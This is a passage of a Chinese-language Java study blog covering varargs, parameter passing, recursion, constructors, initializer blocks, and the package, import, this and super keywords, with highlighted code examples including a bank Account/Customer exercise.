<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实质相当于数组作为参数，使用与数组相同的方式调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> ... num)</span> &#123;      </span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> num[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; num.length; i++) &#123;</span><br><span class="line">        sum += num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//其可与固定个数的方法构成重载，优先选择固定个数方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//但与同类型同数量的数组型的形参方法不构成重载，冲突</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span>[] num)</span> &#123;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>应用举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ArrayTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayTest</span>();</span><br><span class="line">        System.out.println(test.concat(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;bbbb&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">concat</span><span class="params">(String operation, String... strs)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; strs.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">            result += strs[i];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result += (operation + strs[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法的值传递-main方法的控制台输入"><a href="#方法的值传递-main方法的控制台输入" class="headerlink" title="$方法的值传递 main方法的控制台输入"></a>$方法的值传递 main方法的控制台输入</h4><p>基本数据类型执行a&#x3D;b后修改a不会影响b –&gt; a,b的值均直接存在栈中<br>引用数据类型执行a&#x3D;b后修改a会影响到b –&gt; a,b在栈中保存的是其对应类的对象实体在堆中的起始地址，a&#x3D;b下a,b指向同一地址</p>
<p>&#x3D;&#x3D;&gt;推论<br>方法的形参传递时也相当于a&#x3D;b,<br>如果形参是基本数据类型的变量，则将实参保存的<strong>数据值</strong>赋给形参 （不变）<br>如果形参是引用数据类型的变量，则将实参保存的<strong>地址值</strong>赋给形参 （变）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayTest</span> &#123;</span><br><span class="line">    <span class="type">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ArrayTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayTest</span>();</span><br><span class="line">        test.number = <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        test.add(a);</span><br><span class="line">        test.add(test);</span><br><span class="line">        System.out.println(<span class="string">&quot;a=&quot;</span> + a + <span class="string">&quot;number=&quot;</span> + test.number);<span class="comment">//a=10number=11</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> b)</span> &#123;</span><br><span class="line">        b++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(ArrayTest b)</span> &#123;</span><br><span class="line">        b.number++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240629170808.png" alt="方法参数值传递示例1"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240629171145.png" alt="方法参数值传递示例2"></p>
<p>数组元素交换的正确写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] arr,<span class="type">int</span> i,<span class="type">int</span> j)</span>&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    temp = arr[i];</span><br><span class="line">    arr[i] = arr[j];</span><br><span class="line">    arr[j] = temp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main方法传值的方法：Run -&gt; Edit configuration -&gt; build and Run -&gt;选中main函数所在类-&gt;program arguments</p>
<h4 id="方法的递归"><a href="#方法的递归" class="headerlink" title="方法的递归"></a>方法的递归</h4><p>直接递归(A-&gt;A)和间接递归(A-&gt;B-&gt;C-&gt;A)</p>
<p>递归的使用注意：</p>
<ol>
<li>递归调用会占用大量的系统堆栈，内存耗用多，在递归层次多时速度比循环<em>慢得多</em></li>
<li>在要求<em>高性能</em>的情况下<em>尽量避免使用递归</em>，递归既消耗时间又消耗内存，应当使用循环迭代</li>
</ol>
<h3 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h3><p>作用：</p>
<ol>
<li>搭配new关键字，创建类的对象</li>
<li>在创建对象的同时可以给对象的相关属性进行赋值</li>
</ol>
<p>使用：</p>
<ol>
<li>构造器的声明格式：<strong>权限修饰符 类名(形参列表){}</strong></li>
<li>创建类后，若没有显示提供任何构造器地情况下系统会提供默认的空参构造器，且其权限与声明的类权限相同</li>
<li>默认构造器的使用<code>Animal animal = new Animal();</code>的Animal()就是默认构造器</li>
<li>一旦显示声明了构造器，则系统不再提供默认的空参构造器。</li>
<li>一个类中可以声明多个构造器，互相构成重载</li>
<li>构造器与方法无关，但在字节码文件中会转化为一种特殊的init方法，构造方法就是构造器</li>
</ol>
<p>示例代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> leg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(<span class="type">int</span> l)</span> &#123;</span><br><span class="line">        leg = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String n, <span class="type">int</span> l)</span> &#123;</span><br><span class="line">        name = n;</span><br><span class="line">        leg = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name =&quot;</span> + name + <span class="string">&quot; leg =&quot;</span> + leg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnimalTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="number">3</span>);</span><br><span class="line">        animal.getInfo();<span class="comment">//name =null leg =3</span></span><br><span class="line">        <span class="type">Animal</span> <span class="variable">animal1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&quot;tiger&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        animal1.getInfo();<span class="comment">//name =tiger leg =4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="应用示例"><a href="#应用示例" class="headerlink" title="应用示例"></a>应用示例</h4><p>要求：</p>
<blockquote>
<p>1、写一个名为Account的类模拟账户。该类的属性和方法如下图所示。<br>该类包括的属性：账号id，余额balance，年利率annualInterestRate；<br>包含的构造器：自定义<br>包含的方法：访问器方法（getter和setter方法），取款方法withdraw()，存款方法deposit()。<br>提示：在提款方法withdraw中，需要判断用户余额是否能够满足提款数额的要求，如果不能，应给出提示。<br>2、创建Customer类。<br>a. 声明三个私有对象属性：firstName、lastName和account。<br>b. 声明一个公有构造器，这个构造器带有两个代表对象属性的参数（f和l）<br>c. 声明两个公有存取器来访问该对象属性，方法getFirstName和getLastName返回相应的属性。<br>d. 声明setAccount 方法来对account属性赋值。<br>e. 声明getAccount 方法以获取account属性。<br>3、写一个测试程序。<br>（1）创建一个Customer ，名字叫 Jane Smith, 他有一个账号为1000，余额为2000元，年利率为 1.23％ 的账户。<br>（2）对Jane Smith操作。<br>存入 100 元，再取出960元。再取出2000元。<br>打印出Jane Smith 的基本信息：<br>成功存入 ：100.0<br>成功取出：960.0<br>余额不足，取款失败<br>Customer [Smith, Jane] has a account: id is 1000, annualInterestRate is 1.23％, balance is 1140.0</p>
</blockquote>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Account</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> balance;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> annualInterestRate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Account</span><span class="params">(<span class="type">int</span> i, <span class="type">double</span> b, <span class="type">double</span> a)</span> &#123;</span><br><span class="line">        id = i;</span><br><span class="line">        balance = b;</span><br><span class="line">        annualInterestRate = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id1)</span> &#123;</span><br><span class="line">        id = id1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBalance</span><span class="params">(<span class="type">double</span> balance1)</span> &#123;</span><br><span class="line">        balance = balance1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAnnualInterestRate</span><span class="params">(<span class="type">double</span> annualInterestRate1)</span> &#123;</span><br><span class="line">        annualInterestRate = annualInterestRate1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getBalance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getAnnualInterestRate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> annualInterestRate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">withdraw</span><span class="params">(<span class="type">double</span> money)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (money &gt; balance) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;您的余额不足&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            balance = balance - money;</span><br><span class="line">            System.out.println(<span class="string">&quot;成功取出:&quot;</span> + money + <span class="string">&quot;元&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deposit</span><span class="params">(<span class="type">double</span> money)</span> &#123;</span><br><span class="line">        balance = money + balance;</span><br><span class="line">        System.out.println(<span class="string">&quot;成功存入:&quot;</span> + money + <span class="string">&quot;元&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String firstName;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Account account;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Customer</span><span class="params">(String firstName1, String lastName1)</span> &#123;</span><br><span class="line">        firstName = firstName1;</span><br><span class="line">        lastName = lastName1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFirstName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> firstName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLastName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> lastName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Account <span class="title function_">getAccount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccount</span><span class="params">(Account account1)</span> &#123;</span><br><span class="line">        account = account1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">outputInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//Customer [Smith, Jane] has a account: id is 1000, annualInterestRate is 1.23％, balance is 1140.0</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Customer [&quot;</span> + getFirstName() + <span class="string">&#x27;,&#x27;</span> + getLastName() + <span class="string">&quot; has a account: id is &quot;</span> +</span><br><span class="line">                account.getId() + <span class="string">&quot; annualInterestRate is&quot;</span> + account.getAnnualInterestRate() * <span class="number">100</span> +</span><br><span class="line">                <span class="string">&quot; ％, balance is&quot;</span> + account.getBalance());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Customer</span> <span class="variable">customer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>(<span class="string">&quot;Smith&quot;</span>,<span class="string">&quot;Jane&quot;</span>);</span><br><span class="line">        <span class="comment">// Account account = new Account(1000,2000,0.0123);</span></span><br><span class="line">        <span class="comment">// customer.setAccount(account);</span></span><br><span class="line">        <span class="comment">//使用匿名对象</span></span><br><span class="line">        customer.setAccount(<span class="keyword">new</span> <span class="title class_">Account</span>(<span class="number">1000</span>,<span class="number">2000</span>,<span class="number">0.0123</span>));</span><br><span class="line">        customer.getAccount().deposit(<span class="number">100</span>);</span><br><span class="line">        customer.getAccount().withdraw(<span class="number">960</span>);</span><br><span class="line">        customer.getAccount().withdraw(<span class="number">2000</span>);</span><br><span class="line">        customer.outputInfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><p>作用：用来初始化类或对象的信息（初始化类或对象的成员变量），只能使用static修饰</p>
<p>执行时机：</p>
<ul>
<li>静态代码块：随着类的加载而执行，只会执行一次(因此内部只能调用静态方法属性，其他还没加载)</li>
<li>非静态代码块：随着对象的创建而执行，每次创建(new)执行一次</li>
<li>静态代码块的执行先于非静态代码块，如果声明多个静态&#x2F;非静态，按声明顺序执行，实际应当直接合成一个！<br>作用：</li>
<li>静态代码块：初始化类的信息，内部可以声明变量，调用属性和方法，编写输出语句等</li>
<li>非静态代码块：初始化对象的信息，内部可以声明变量，调用属性和方法，编写输出语句等</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;person&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//非静态代码块</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;非静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//静态代码块</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><h4 id="关键字-package-指明所在包"><a href="#关键字-package-指明所在包" class="headerlink" title="关键字 package 指明所在包"></a>关键字 package 指明所在包</h4><p>package:用于指明该文件中定义的类、接口等结构所在的包。<br>说明：</p>
<ol>
<li>一个源文件只能有一个声明包的package语句</li>
<li>该语句必须作为Java源文件的第一条语句出现，缺省则指定为无名包</li>
<li>包名按规范应该全部小写，通常使用公司所在域名的导致，如<code>com.aliyun.xxx</code>，不能使用<code>java.xxx</code>，会视作JDK中内容。</li>
<li>包对应于文件系统的目录，package语句使用’.’来指定包(目录)的层次,每.一次表示一层目录</li>
<li>同一个包下可以声明多个结构(类、接口)，但不能定义同名的结构，不同包下可以定义同名结构</li>
</ol>
<p>包的作用</p>
<ol>
<li>划分项目层次，便于管理</li>
<li>帮助管理大型软件系统，将功能相近的类划分到同一个包中</li>
<li>解决类名冲突</li>
<li>限制类的访问</li>
</ol>
<p>JDK常见包<br>java.lang:java语言的核心类，如String,Math,Integer,System,Thread，提供常用功能<br>java.net:包含执行与网络相关操作的类和接口<br>java.io:包含能提供多种输入输出功能的类<br>java.util:包含一些使用工具，如定义系统特性、接口的集合框架类、使用与日期日历相关的函数<br>java.text:包含java格式化相关的类<br>java.sql:包含Java进行JDBC数据库编程的相关类&#x2F;接口<br>java.awt:包含构成抽象窗口工具集的多个类，用于构建和管理应用（不太重要）</p>
<h4 id="关键字-import-导入包"><a href="#关键字-import-导入包" class="headerlink" title="关键字 import 导入包"></a>关键字 import 导入包</h4><p>import:显式引入指定包下所需要的类<br>注意：</p>
<ol>
<li>import语句放在声明包的语句(package)和类的声明之间</li>
<li>如果需要导入多个类或接口，并列显示多个import语句</li>
<li>使用<code>a.*</code>导入结构，可以带入a包下的所有结构</li>
<li>如果导入的类或者接口是java.lang包下或当前包下的，可以省略import语句</li>
<li>如果已经导入java.a包下的类，若还需要a包的子包下的类，仍然需要导入</li>
<li>如果代码中使用不同包下同名类，需要使用类的全类名(包名.类名)方式指明调用的类</li>
<li><code>import static</code>可以调用指定类或接口下的静态属性或方法：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.System.out;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        out.println(<span class="string">&quot;lili&quot;</span>);</span><br><span class="line">        <span class="comment">//相当于System.out.println(&quot;&quot;)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="关键字-this-当前对象"><a href="#关键字-this-当前对象" class="headerlink" title="关键字 this 当前对象"></a>关键字 this 当前对象</h4><p>使用场景：<br>声明某个属性的set方法(或含有形参的构造)时，通过形参为对应属性赋值，若属性名与形参名相同，含有this的是属性，没有的是形参<br>在实例方法或构造器中，如果使用当前类的成员变量或成员方法可以在其前面添加this，增强程序的可读性。不过，通常我们都习惯省略this。<br>但是，当形参与成员变量同名时，如果在方法内或构造器内需要使用成员变量，必须添加this来表明该变量是类的成员变量。即：我们可以用this来区分<code>成员变量</code>和<code>局部变量</code>。另外，使用this访问属性和方法时，如果在本类中未找到，会从父类中查找。这个在继承中会讲到。</p>
<p>this只可以调用成员变量、方法<br>this即当前对象(在方法中调用时)或当前正在创建的对象(在构造器中调用时)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Account</span><span class="params">(<span class="type">int</span> id, <span class="type">double</span> balance, <span class="type">double</span> annualInterestRate)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line">    <span class="built_in">this</span>.balance = balance;</span><br><span class="line">    <span class="built_in">this</span>.annualInterestRate = annualInterestRate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个重要应用：构造方法的简化，在构造器中调用当前类中指定的其他构造器<br>要求:this(形参列表)必须声明在当前构造器的首行，最多声明一个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//不能再调，避免成环</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>();</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(name);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比较两个对象的大小：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Public <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Girl girl)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">this</span>.age &gt; girl.age)&#123;<span class="comment">//当前对象的age和比较对象的age</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="关键字-super-父类的"><a href="#关键字-super-父类的" class="headerlink" title="关键字 super 父类的"></a>关键字 super 父类的</h4><p>应用：</p>
<ul>
<li>super可用于访问父类中定义的属性尤其是同名属性–&gt;根据编程规范<em>子类属性必须和父类不同</em>，所以尽量避免</li>
<li>super可用于调用父类中定义的成员方法</li>
<li>super可用于在子类构造器中调用父类的构造器</li>
</ul>
<p>super调用父类属性、方法<br>子类继承父类后，我们就可以<em>在子类的方法或构造器</em>中，在满足封装性的情况下(即原父类的方法或属性是子类可调用的)，调用父类的方法和属性，需要使用<code>super.</code>结构，这在子类和父类没有同名属性或重写方法时可以省略（通常省略），调用父类的同名属性或重写方法必须使用。</p>
<ul>
<li><p><strong>方法前面没有super.和this.</strong></p>
<ul>
<li>先从子类找匹配方法，如果没有，再从直接父类找，再没有，继续往上追溯</li>
</ul>
</li>
<li><p><strong>方法前面有this.</strong></p>
<ul>
<li>先从子类找匹配方法，如果没有，再从直接父类找，再没有，继续往上追溯</li>
</ul>
</li>
<li><p><strong>方法前面有super.</strong></p>
<ul>
<li>从当前子类的直接父类找，如果没有，继续往上追溯</li>
</ul>
</li>
<li><p><strong>变量前面没有super.和this.</strong></p>
<ul>
<li>在构造器、代码块、方法中如果出现使用某个变量，先查看是否是当前块声明的<code>局部变量</code>，</li>
<li>如果不是局部变量，先从当前执行代码的<code>本类去找成员变量</code></li>
<li>如果从当前执行代码的本类中没有找到，会往上找<code>父类声明的成员变量</code>（权限修饰符允许在子类中访问的）</li>
</ul>
</li>
<li><p><strong>变量前面有this.</strong> </p>
<ul>
<li>通过this找成员变量时，先从当前执行代码的&#x3D;&#x3D;本类去找成员变量&#x3D;&#x3D;</li>
<li>如果从当前执行代码的本类中没有找到，会往上找&#x3D;&#x3D;父类声明的成员变量（&#x3D;&#x3D;权限修饰符允许在子类中访问的）</li>
</ul>
</li>
<li><p><strong>变量前面super.</strong> </p>
<ul>
<li>通过super找成员变量，直接从当前执行代码的直接父类去找成员变量（权限修饰符允许在子类中访问的）</li>
<li>如果直接父类没有，就去父类的父类中找（权限修饰符允许在子类中访问的）</li>
</ul>
</li>
</ul>
<p>super调用父类构造器<br>① 子类继承父类时，不会继承父类的构造器。只能通过“super(形参列表)”的方式调用父类指定的构造器。<br>② 规定：“super(形参列表)”，必须声明在构造器的首行。<br>③ 我们前面讲过，在构造器的首行可以使用”this(形参列表)”，调用本类中重载的构造器，<br>    结合②，结论：在构造器的首行，”this(形参列表)” 和 “super(形参列表)”只能二选一。<br>④ 如果在子类构造器的首行既没有显示调用”this(形参列表)”，也没有显式调用”super(形参列表)”，<br>    则*子类此构造器默认调用”super()”*，即调用父类中空参的构造器。<br>⑤ 由③和④得到结论：子类的任何一个构造器中，要么会调用本类中重载的构造器，要么会调用父类的构造器。<br>    只能是这两种情况之一。<br>⑥ 由⑤得到：一个类中声明有n个构造器，最多有n-1个构造器中使用了”this(形参列表)”，则剩下的那个一定使用”super(形参列表)”。</p>
<p>&#x3D;&#x3D;&gt;我们在通过子类的构造器创建对象时，一定会直接或间接地调用父类的构造器来加载父类的方法和属性到内存中<br>&#x3D;&#x3D;&gt;常见错误： <strong>如果子类构造器中既未显式调用父类或本类的构造器，且父类中又没有空参的构造器，则<code>编译出错</code>。</strong><br>&#x3D;&#x3D;&gt;我们定义的类都是对object类的继承</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">double</span> weight;</span><br><span class="line">    <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> <span class="string">&quot;223&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        weight+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">grow</span><span class="params">()</span>&#123;</span><br><span class="line">        age+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    String school;</span><br><span class="line">    String id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.weight+=<span class="number">0.5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;id=&quot;</span>+id);<span class="comment">// 就近原则</span></span><br><span class="line">        System.out.println(<span class="string">&quot;id=&quot;</span>+<span class="built_in">this</span>.id);</span><br><span class="line">        System.out.println(<span class="string">&quot;fid=&quot;</span>+<span class="built_in">super</span>.id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HumanTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line"></span><br><span class="line">        student.weight=<span 